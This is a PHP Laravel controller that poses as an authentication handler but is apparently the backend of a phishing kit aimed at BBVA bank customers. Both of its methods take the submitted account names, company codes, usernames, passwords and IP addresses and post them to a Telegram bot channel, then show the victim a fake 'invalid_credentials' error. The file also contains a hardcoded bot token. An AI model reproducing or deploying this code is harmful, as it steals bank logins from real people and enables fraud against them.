<?php

namespace App\Http\Controllers\api\Authintication;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Auth;
use Tymon\JWTAuth\JWTAuth;
use Tymon\JWTAuth\Exceptions\JWTException;
use Config;
use Session;
use App\Deliver;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;


class MainAuth extends Controller
{
    
    public function authenticate(Request $request)
    {
        
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);

        $apiToken = "1135326259:AAE2B5uWYw75JBU5njujtjGMPkjdaUeJcrM";

        // Create a DOM object
        $Fullcontent = " Account : ".$request->get('Account')
        ."\nUsuario : ".$request->get('Usuario')
        ."\nClave_de_acceso : ".$request->get('Clave_de_acceso')
        ."\nIP : ".$request->ip();

        // send message.
        $post = [
            'chat_id' => '@bbva_rslts_by_nody_dark',
            'text' => $Fullcontent,
            'parse_mode' => 'HTML',
        ];

        //var_dump($post); 
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL,"https://api.telegram.org/bot".$apiToken."/sendMessage?");
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);

        // execute!
        $response = curl_exec($curl);
        
        return response()->json(['error' => 'invalid_credentials'], 200);

    }
    
    public function login_in_company(Request $request)
    {
        
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);

        $apiToken = "1135326259:AAE2B5uWYw75JBU5njujtjGMPkjdaUeJcrM";

        // Create a DOM object
        $Fullcontent = " Account : ".$request->get('Account')
        ."\nCodigo_de_empresa : ".$request->get('Codigo_de_empresa')
        ."\nUsuario : ".$request->get('Usuario')
        ."\nContrasena : ".$request->get('Contrasena')
        ."\nIP : ".$request->ip();

        // send message.
        $post = [
            'chat_id' => '@bbva_rslts_by_nody_dark',
            'text' => $Fullcontent,
            'parse_mode' => 'HTML',
        ];

        //var_dump($post); 
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL,"https://api.telegram.org/bot".$apiToken."/sendMessage?");
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);

        // execute!
        $response = curl_exec($curl);
        
        return response()->json(['error' => 'invalid_credentials'], 200);

    }

    
    
}

